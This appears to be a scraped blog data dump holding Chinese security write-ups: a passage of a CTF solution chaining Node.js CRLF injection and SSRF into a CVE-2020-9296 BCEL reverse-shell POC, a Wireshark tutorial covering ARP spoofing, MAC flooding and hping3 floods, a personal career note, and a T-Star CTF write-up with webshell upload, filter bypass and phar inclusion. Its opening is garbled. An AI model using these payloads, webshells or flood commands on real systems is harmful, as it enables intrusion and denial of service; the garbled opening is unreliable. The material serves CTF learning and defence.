ĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ 构造请求： 12&gt; http.get(&#x27;http://192.168.123.37:2233/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;) 返回包 123456789101112131415161718192021222324252627282930313233&gt; nc -lv 0.0.0.0 2233GET / HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test: HTTP/1.1Host: 192.168.123.37:2233Connection: close 在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。 至此，完成了 nodejs CRLF 注入复现 再次回到题目中现在我们可以通过 题目的 GET 代理发送 POST请求（假如题目中的 node 版本是 &lt; 9），现在尝试利用漏洞，看看是否能利用成功。 构造 POC，node 或 F12 控制运行 12345678910111213// netflix 的内网 IP 地址netflix_host = &quot;10.0.49.14&quot;// 在复现 CVE-2020-9296 时生成的 BCEL 编码bcel_evil = &#x27;&#x27;// 以下不用改post_payload = &#x27;[\\u&#123;017b&#125;\\u&#123;0122&#125;name\\u&#123;0122&#125;:\\u&#123;0122&#125;$\\u&#123;017b&#125;\\u&#123;0127&#125;1\\u&#123;0127&#125;.getClass().forName(\\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\\u&#123;0127&#125;).newInstance().loadClass(\\u&#123;0127&#125;&#x27; + bcel_evil + &#x27;\\u&#123;0127&#125;).newInstance().class\\u&#123;017d&#125;\\u&#123;0122&#125;,\\u&#123;0122&#125;ownerEmail\\u&#123;0122&#125;:\\u&#123;0122&#125;test@example.org\\u&#123;0122&#125;,\\u&#123;0122&#125;retryCount\\u&#123;0122&#125;:\\u&#123;0122&#125;3\\u&#123;0122&#125;,\\u&#123;0122&#125;timeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;1200\\u&#123;0122&#125;,\\u&#123;0122&#125;inputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;sourceRequestId\\u&#123;0122&#125;,\\u&#123;0122&#125;qcElementType\\u&#123;0122&#125;],\\u&#123;0122&#125;outputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;state\\u&#123;0122&#125;,\\u&#123;0122&#125;skipped\\u&#123;0122&#125;,\\u&#123;0122&#125;result\\u&#123;0122&#125;],\\u&#123;0122&#125;timeoutPolicy\\u&#123;0122&#125;:\\u&#123;0122&#125;TIME_OUT_WF\\u&#123;0122&#125;,\\u&#123;0122&#125;retryLogic\\u&#123;0122&#125;:\\u&#123;0122&#125;FIXED\\u&#123;0122&#125;,\\u&#123;0122&#125;retryDelaySeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;600\\u&#123;0122&#125;,\\u&#123;0122&#125;responseTimeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;3600\\u&#123;0122&#125;,\\u&#123;0122&#125;concurrentExecLimit\\u&#123;0122&#125;:\\u&#123;0122&#125;100\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitFrequencyInSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;60\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitPerFrequency\\u&#123;0122&#125;:\\u&#123;0122&#125;50\\u&#123;0122&#125;,\\u&#123;0122&#125;isolationgroupId\\u&#123;0122&#125;:\\u&#123;0122&#125;myIsolationGroupId\\u&#123;0122&#125;\\u&#123;017d&#125;]&#x27;encode_post_payload = encodeURI(&#x27;http://0.0.0.0:3000/\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;POST\\u&#123;0120&#125;/search?url=http://&#x27; + netflix_host + &#x27;:8080/api/metadata/taskdefs\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Type:application/json\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Length:&#x27; + post_payload.length + &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;&#x27; + post_payload+ &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;GET\\u&#123;0120&#125;/&#x27;)poc = &quot;GET /proxy?url=&quot; + encode_post_payload + &quot; HTTP/1.1&quot;console.log(poc) 这里的 encodeURI 编码 1 次是防止传输过程中特殊字符被干掉 。 console.log(poc) 输出的东西替换 HTTP 包第一行即可。 成功反弹 这个题目流程有点多，做个小总结 nodejs 数组绕过管理员登录 isPublic 绕过，通过 /proxy 获取 /flag 得到提示 通过 docker 默认网段，或者题目给的提示 fuzz 内网网段的8080端口 构造 CVE-2020-9296 Netflix Post POC 反弹 shell 利用 nodejs &lt; 9 进行 CRLF注入，发送 CVE-2020-9296 Netflix Post POC 最终通过 cat /flag 获取 flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"Wireshark入门与实战","slug":"2021/Wireshark入门与实战","date":"2021-04-01T13:13:59.000Z","updated":"2021-04-25T12:09:59.526Z","comments":true,"path":"/p/2021/Wireshark入门与实战/","link":"","permalink":"https://tari.moe/p/2021/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/","excerpt":"","text":"wireshark入门: https://www.bilibili.com/video/BV1X5411x7R4他这里顺序有点误，应该是 P1-P26，P32-P39，P27-P31 Wireshark 入门伯克利包过滤 - Wireshark包过滤BPF（Berkeley Packet Filter） 采用与自然语言相近的语法，利用语法构造字符串确定保留具体符合规则的数据包而忽略其他数据包 最简单语法空白字符，任何数据包都符合空白字符规则 语法规则 type表示对象 如 IP地址、子网或端口 -&gt; host、net、port dir 表示数据包传输的方向 -&gt; src、dst proto 表示与数据包匹配的协议类型 -&gt; ether、ip、tcp、arp 演示实例会发现直接在 Apply a display filter 里输入是无法过滤的， 新版的 wireshark 的 expression 功能在如下图所示这里在 wireshark 里，不是直接使用 host 来表示主机名和对应的 ip 地址，而是使用 ip.addr = &lt;ip&gt; 来表示其他也是类似，如 ip.src 和 ip.dst 在找服务这一块，服务都是以占用端口的形式展示的，因此可以通过这种形式来看怎么用，然后点OK即可。 也可以使用 逻辑运算符实现筛选，如 tcp.port == 80 and ip.src == 192.168.123.37当然也有类似补全的操作 wireshark包过滤器分类 - 遵循伯克利语法规则捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包 只捕获目标端口为80的TCP数据包 -&gt; tcp dst port 80 捕获目的主机IP地址为 192.168.123.37 的数据包 -&gt; dst host 192.168.123.37 host 不支持 cidr 域名 书写 筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选然后显示过滤器有两种创建方式 输入框创建 当不知道如何创建就看下图这里 数据包细节面板创建 ... and Selected 表示 目前的过滤器 + and 进行连接一开始是只有 Selected 和 Not Selected 的 表达式规则 主题 + 运算符 + 值 逻辑关系 与 或 非 -&gt; and (&amp;&amp;) or (||) not (!) Wireshark 捕获数据包文件保存 杂项设置wireshark 数据包颜色的意思可以通过 视图 -&gt; 着色规则进行查看 wireshark 故障包过滤有5个等级 Error 严重错误，譬如：畸形数据包或识别出数据包协议头部的某些字段和预期值不符 Warning 一般性问题（应用程序问题或通信问题），譬如：TCP zero window ,TCP window full ,TCP报文段失序，TCP报文段丢失 Note 可能引发故障的异常现象（正常行为），譬如：TCP重传，重复确认，快速重传 Chat 符合常规流量的特征，譬如：SYN,FIN,RST Comment OK 123_ws.expert.severity &lt;= Note或者_ws.expert.severity &lt;= Chat 查看wireshark 内置文件路径 修改wireshark默认配置 Wireshark 网络分析# Wireshark 部署方式 远程数据包捕获方式1:开启远程桌面，rdp服务，在系统中安装wireshark进行抓包分析缺点: 在于远程登录过程中，都会产生无关与目的远程连接数据流量 方式2: wireshark 远程抓包windows服务端: winpcap -&gt; rpcapd 12cd &quot;C:\\Program Files (x86)\\WinPcap\\&quot;.\\rpcapd.exe -n 客户端: wireshark linuxmacos注意 macos 版本没有直接抓取数据包的功能，可参考https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/ 本地数据包捕获wireshark 不能抓取本地环回网卡数据包不过可以使用 RawCaphttps://www.netresec.com/?page=RawCap 12# cmdRawCap.exe 然后浏览器访问 localhost 不过可以通过访问本机 ip 代替 localhost 间接捉取数据包（狗头 虚拟机数据包捕获选择对应网卡即可。。。 比如在 kali 上运行 1sudo netdiscover -r 192.168.18.1/24 哈哈哈哈，原来arp广播还真就这么直白，，Who has ….? Tell …（netdiscover 还真直白 ARP欺骗捕获数据包攻击原则 任何主机均能发送伪造包给局域网中的另一主机； 任一主机相信它们接受到的所有包； 当一个新的响应包到达时，它甚至在没有请求包被发送的情况下覆盖掉旧的记录。 实践kali 一般要先安装 1sudo apt install dsniff kali 上运行 123sudo arpspoof -i eth0 -t &lt;欺骗的目标&gt; &lt;我是谁&gt;# 如sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1 然后此时在 192.168.123.37 这台机器上wireshark 选择网卡 eth0，因为是欺骗这一张网卡，wireshark 筛选过滤器填入 icmp 查看 12# 然后在 192.168.123.37 上 ping 网关ping 192.168.123.1 会发现 192.168.123.1 的 mac 地址是 kali的。。。所以在 192.168.123.37 上是上不了网的，除非kali上开启了数据包转发，当 ip_forward 为 0 时，欺骗的目标 上不了网，当该值为 1 时，会把192.168.123.37发送的数据包做转发给网关，就可以正常上网，但是192.168.123.37的数据包都会经过 kali。 Wireshark 网络安全链路层安全针对于交换机的安全问题MAC对称欺骗 —— macchange擦除只是暂时的，不是覆盖原来的mac地址，机器重启后就会恢复。通过MAC地址欺骗达到隐藏真实主机的目的 12345678-e 改变的是后三字节，即不改变生产厂商-a 同一类型的随机供应商地址 ( macchanger --list=Huawei 就是同一类型 )-A 随机厂商随机地址-p 永久修改-r 完全随机-l 查看支持的厂商-b-m 设置前需要关闭网卡 12345sudo ifconfig eth0 down# -m 不能自己完全随意起，如果前三字节不符合 mac 地址命名规范会报错# [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested addresssudo macchanger -m 00:90:d1:33:33:33 eth0sudo ifconfig eth0 up 随机化设置 1sudo macchanger -r eth0 MAC地址泛洪分析 —— 溢出交换机CAM表交换机之所以可以交换数据，是因为交换机在内存中维护着一张CAM表，即 端口 &lt;-&gt; MAC地址当表被添满时，其他主机就无法在对应的端口正常交互数据 12345sudo macof -h# -x 源端口 -y 目的端口# 泛洪sudo macof -i eth0 wireshark 抓包分析因为实际中，主要数据包类型是 tcp 或 udp下面只有 ip 数据包，因此很可能有问题（当然有问题，哈哈很多无关的 ip 以及 mac地址，数据包很小 查找源头端口交换机 1display mac-address 找到对应的端口 防御策略限制交换机端口 MAC 地址数量，比如这个端口只能有3或5个，那他就只能添加3或5跳记录到CAM表，那么就无法溢出啦。 STP操纵生成树协议按照树的结构构造网络拓扑，避免形成回路。STP协议中的各交换机通过交换BPDU报文信息传播生成树信息，如果伪造BPDU报文，控制交换机的端口转发状态，从而动态改变网络拓扑，劫持网络流量到本地。 广播风暴ARP DHCP 通过在局域网中广播，占用网络资源，网络性能下降 -&gt; 网络速度变慢产生原因 网络短路引发广播风暴 -&gt; 8根连接 两两连接 -&gt; 互联网上网线导致网络性能下降 网络中存在环路引发广播风暴 网卡损坏引发广播风暴 蠕虫病毒引发广播风暴 网络层安全中间人安全测试 - 欺骗ARP协议 局域网内用来寻找主机发送数据包的协议，通过它可以找到指定 IP 地址对应的 MAC地址 每台终端设备都具有ARP缓存表 arp -a 查看缓存表 arp -d 删除缓存表 表的填充，寻找 IP 地址对应MAC地址，如果没有则广播此时设置的目标MAC地址为 (00:00:00:00:00:00) 是否具有IP地址对应的MAC地址，找到填充。 ARP协议分析介绍显示过滤器 arp 请求数据包 arp.opcode == 0x0001 响应数据包 arp.opcode == 0x0002 查看源 MAC 地址 arp.src.hw_mac == 00:00:00:00:00:00 arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002 专家系统分析网关地址与局域网中的计算机具有一致的MAC地址 出现大量ARP数据包的原因 ARP主机扫描 ARP病毒进行通信 ARP欺骗 中间人安全测试 防御ARP欺骗措施 静态绑定ARP表 arp -s 网关的IP地址 网关的MAC地址 不适合大型网络使用 需要管理员权限 win netsh i i show in -&gt; 查看网卡编号 win netsh -c &quot;i i&quot; add neighbors &lt;网卡编号&gt; &lt;网关IP地址&gt; &lt;网关MAC地址&gt; - 验证是否静态绑定 `arp -a` 交换机也有端口安全配置，固定MAC和IP使用端口 不适合大型网络使用 交换机 DHCP-Snooping 交换机监听DHCP数据，提取IP和MAC建立DHCP Snooping的绑定表 划分VLAN 每一个VLAN就是一个广播域 -&gt; 限制网络范围 泪滴安全测试原理介绍 针对于IP协议的安全测试，主要是伪造IP地址和发送畸形数据包 向目标发送畸形数据包，使得IP数据包碎片在重组的过程中有重合的部分（偏移位置不够），从而导致目标系统无法进行重组，进一步导致系统奔溃而停止服务。 下载IP协议案例数据包: https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap 根据数据包表示 Identification 来确实是否属于同一分组 分析 第8和第9个数据包偏移量仅为 24，远不够36。因此无法重组 不过对现在的计算机来说，泪滴测试不会对计算机造成很大的影响，所以基本不关心泪滴安全测试了。不够泪滴测试和ARP泛洪结合，还是能对计算机造成很大的困扰。 传输层安全传输层主要针对TCP和UDP协议，因此拒绝服务DOS（Denial of Service）也主要是基于这两个协议 TCP SYN 泛洪TCP连接介绍 客户端发送SYN到服务器 服务器响应 SYN+ACK 到客户机 客户机发送ACK到服务器 使用 wireshark 分析 TCP 三次握手数据包 TCP SYN flooding 安全测试原理 客户端发送syn服务端返回syn+ack，如果客户端不再发送ack，那么服务端将等待超时，重新发送syn+ack。如果是大量的等待，就可能导致服务器奔溃。 案例演示 1hping3 -q -n --rand-source -S -p 80 --flood &lt;目标IP地址&gt; -q: 安静模式 -n: 数字化输出，象征性输出主机地址 –rand-source: 随机源IP -S: 发送SYN数据包 -p: 指向端口 –flood: 使用泛洪 为了便于分析。打开 Statistics -&gt; Flow Graph先选择流类型为TCP发现客户端发送syn服务端返回syn+ack，但客户端不再发送ack，导致资源消耗。 TCP SYN flooding安全防御 丢弃第一个SYN数据包 -&gt; 用户体验差 反向探测 -&gt; 向源地址方向发送探测包，确定源地址合法性 代理模式 -&gt; 防火墙代理 -&gt; 即先与防火墙建立tcp连接 UDP 泛洪非连接状态的协议，简洁协议，控制选项少，不可靠，传输速率高，适合大文件传输 UDP协议关键点 源端口 目的端口 UDP报文长度 检验码 UDP flooding 安全测试原理: 测试人员向目标发送大量巨大的UDP数据包，就会使网络资源被耗尽 1sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000 -a: 伪造的 ip-s: 53端口 UDP flooding 安全防御防火墙 限流: 将链路中的UDP报文控制在合理的范围，当超过指定值，则丢弃UDP报文 指纹学习: 先学习，在匹配 网络取证简析wireshark 恢复传输文件无论使用何种应用层协议，对于传输层来说都是TCP或UDP协议，来恢复一下wireshark官网提供的文件https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gzhttp_with_jpegs.cap.gz 首先在显示过滤器中筛选具有jpeg内容的数据包: http contains &quot;jpeg&quot;选第一个，追踪tcp流最后点一下 Save as… 保存为 xxx.bin 就好，然后用16进制编辑器打开，JPEG的文件开始字节为 FF D8，文件结束字节为 FF D9然后把其余没用的都删除掉，这里因为结束符号就是最后了，因此把上图 FF D8 之前的都删除掉就好了。成功恢复。 取证实践案例https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim好像没了。。。然后在Github找了个: https://github.com/aarud/Pcaps/blob/master/evidence01.pcap 1.寻找Ann的通信好友名称根据题目名称提示 aim 通信，wireshark 自带 aim 解密这三项依次改为然后查看数据包，发现通信好友名称是 Sec558user1 2. 通信过程中的第一条信息内容是什么 3. Ann 通信过程中传输的文件名字显示过滤器输入 data，然后追踪tcp流文件名字 4. 还原Ann发送文件并得出文件幻数（magic number）文件幻数介绍: https://baike.baidu.com/item/magic%20number说直白点就是以 zip 之父的首字母PK来命名，对应的16进制是50 4B 03 0450(P)4B(K)03(文本结束)04(传输结束)，组合起来就是压缩包的标识开头。那为啥word文档的文件开头是这个，把word文档后缀改为.zip试试，这是微软2006年公布的OOXML规范。 显示过滤器输入 data，然后追踪tcp流另存为，xxx.bin，用16进制编辑器打开xxx.bin 5. 查看文件md5值 应用层网络安全暴力破解分析分析使用 medusa 破解 ssh 登录 后门分析某些软件具有其他的目的 -&gt; 设置隐藏后门这里针对vsftpd 2.3.4 后门帐号密码不要紧，有 :) 笑脸就行，因此这个后门也被称为笑脸后门，2333","categories":[{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"流量分析/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"流量分析/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"}],"tags":[{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"}]},{"title":"=======总结 & 手动分割线=======","slug":"2021/手动分割线","date":"2021-04-01T10:40:39.000Z","updated":"2022-02-01T04:23:37.799Z","comments":true,"path":"/p/2021/手动分割线/","link":"","permalink":"https://tari.moe/p/2021/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/","excerpt":"","text":"由于 notion 和 语雀 使用起来过于舒适，差点忘了自己还有个博客，直到 （逃 上次写博客还是大三上学期末，现在都差不多要毕业了。大二大三那会，在学校啥都干，从之前的文章也能看出，服务器运维、开发、CTF…. 顺便做个总结，这一年虽没写博客，不过找了两份实习，一个是做渗透测试、一个是安全攻防研究，还有学校各种各样的事情，好像上次跑 hexo d 还是不久之前（主要是被 notion 和 语雀 惯懒了）… 2020.4 - 2020.10 渗透测试实习生，算是正式入门网安吧…感谢组内大佬肯收留我个菜鸡，哈哈，一开始还很纠结，以后是做安全还是运维，所以各投了一份实习（刚过完年做师兄的疯狂安利下），面试和准备，发现还是对网安更敢兴趣一些~，所以选了网安。不过现在偶尔会想，要是当初我选了另外一个实习，现在会怎样？（毕竟两边面试都过了），实习过程中被各种带飞，认识了几个大佬，其中的项目经验，都给秋招打下了基础。 2020.10 - 2020.12 学校项目，模仿大佬的开源项目，结合深度学习和网安和同学一起做了个《基于A2C和MSF的自适应渗透测试工具》，作为代码和文档的主要贡献者，虽然没做到想象中效果，不过也是第一次尝试去学习和改动大佬的开源项目。虽然功能上没能做的很好（不过还是做了许多的不错的优化），但是以后对开源项目都不会有那种陌生的隔离感了（就这个语言学过，也写过项目，但看着大佬写的就是有点抽象） 2020.11 - 2021.3 安全攻防研究实习生，第一次在大型项目中技术上承担一定角色，挑战很大，过了一个月才习惯这些工作，之前实习主要是渗透，这次还有很多代码审计、尤其是hvv相关的，代码审计任务很繁重，平均一天要审个6000+行代码（而且还是各种语言，有的压根就不怎么熟悉…）。也做了很多尝试，比如威胁建模评审，安全红线落实等，也是第一次接触SDL，也由此知道为啥大厂核心业务漏洞会难挖，毕竟别人都有做SDL流程。当然除此之外，由于我们部门很看重产出，所以这次实习也没上次实习那么轻松。特别是我这个产品线，迭代了很多代，漏洞特别难挖，而且渗透也比较麻烦，因为环境比较复杂，没有在搞站那会随随便便抓个包改改参数那么舒服了~ 当然产出不仅仅是挖洞，还可以有安全研究分享，输出文档等等等等~ 总之就是从之前各种打杂到现在会稍微专注于一个方向，所以成长也挺快的，虽然还是很菜（x，其实主要还是被各种大佬带飞，少走了一些坑 （ 今年，虽然过年很久了，先立一些 flag 吧~，毕竟实习了两次，发现一些东西需要补补了 SDL，把实习学的做个总结并做一些拓展 云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到 二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少 代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~ 迟些会把一些正常点的笔记放上来，2333","categories":[{"name":"总结","slug":"总结","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"小记","slug":"总结/小记","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup","slug":"2020/2020T-Star-ctf","date":"2020-06-30T14:37:12.000Z","updated":"2022-10-12T01:13:00.724Z","comments":true,"path":"/p/2020/2020T-Star-ctf/","link":"","permalink":"https://tari.moe/p/2020/2020T-Star-ctf/","excerpt":"","text":"0x01 签到打开题目链接，由HTTP请求头可知使用PHP，先把PHP的webshell改名为jpg，然后根据题目提示使用burp抓包绕过前端js验证，把后缀名改回php。 通过查看网页源码得知上传webshell的路径，通过冰蝎连上，在/var/www/key发现flag，key{K735c9f0D7ddc3b9}，如下图所示。 0x02 命令执行基础ping命令执行题，先随便ping一下本机能成功执行命令，然后发现使用分号分割发现执行命令没有回显，于是用管道符把原有输出给覆盖掉，ls发现可以正常当前目录，然后ls .. 发现flag在key.php里，如下图所示。 0x03 你能爆破吗在用户名和密码框随便输入了点内容发现回显sql语句，不过考虑到题目名称是爆破，先尝试用Burp fuzz一下用户名和密码，期间试了下登录，发现http头里怎么都没有Cookie，最后等到fuzz完，发现用户名和密码都是admin。 登录进去发现了题目描述里提示的Cookie，字符串以等号结尾尝试一下base64解码后，发现是admin ，如下图所示。 手动改了下数据包发现了猫腻，Cookie处和题目描述一样可以注入,不过手工测试没有进行base64编码，导致乱码产生。对整个payload进行base64编码后发现sql语句能正常拼接，如下图所示。 使用sqlmap进行爆破，注意要使用base64encode tamper。先爆破库，分别试challenges和security，然后在security库发现flag，接着爆破表，然后爆破字段，然后根据字段dump出来就可以得到flag了。 0x04 文件上传害，这个题全是泪。首先上传webshell，php结尾文件不给过，然后改后缀为jpg、gif，也不给过。然后想到合并图片和webshell，如下图。 现在终于可以上传上去了，因为图片是限制在20k~100k的，webshell在后面，截图截不到，如下图所示。 尝试使用%00和0x00截断gif，即bu.php%00.gif 和在burp hex里用0x00截断，虽然能上传成功，但发现图片访问不到，如下图所示。可能是PHP版本原因，不能用了。 只能另辟蹊径，发现中间件是Apache，拿出之前刷题做的笔记，一个个试，如下图所示。 发生pht和php7都可以正常访问，上传了个webshell，但是php代码解析异常！！！，先尝试一下为啥这样，比如我用 &lt;?php phpinfo(); ?&gt; 发现只剩下 info(); ?&gt; 。 这时想起题目说字符过滤，原来是在这，对比观察，发现过滤了 php和 &lt;? ，于是一步步尝试，发现了只会过滤一次，即：使用 pphphp 会被过滤为 php，但仍可到达我的目的，最终构造成 1&lt;&lt;??pphphp pphphpinfo(); ?&gt; 终于成功解析了！！如下二图所示。 试着使用一句话木马，发现连不上，使用 highlight_file(FILE); 发现eval被过滤了。然后尝试system之类的执行系统命令函数，发现可行，最终构造的payload如下图所示。然后并接上git图上传抓包改后缀为pht即可利用。 通过ls 发现flag在 ../../key ，如下图所示。 0x05 文件包含GetShell经题目和描述已经可以猜出是phar+lfi了，然后在网页源码发现lfi.txt，即泄露的源码。 尝试上传php webshell发现只能上传txt结尾的文件。 现在题目思路已经很清晰了，先利用phar构造一个poc，后缀改为txt上传，如下图所示。 然后利用phar伪协议读取该路径，然后把PoC phar里写入的虚拟文件shell.php include进来就可以执行php代码了。 不过也有一些小坑，因为题目读取时会拼接文件名字，也就是sprintf函数，执行代码不能用GET方式，不然就不是访问到我们上传的文件了。其次就是最后写shell即可，不用写shell.php，因为sprintf帮我们加个了.php。 ls一下当前目录发现有个flag.php，最终读出来的flag如下二图所示。 EXP 123456789101112131415161718192021222324252627&lt;?php try&#123; $p = new Phar(&quot;my.phar&quot;, 0, &#x27;my.phar&#x27;);&#125; catch (UnexpectedValueException $e) &#123; die(&#x27;Could not open my.phar&#x27;);&#125; catch (BadMethodCallException $e) &#123; echo 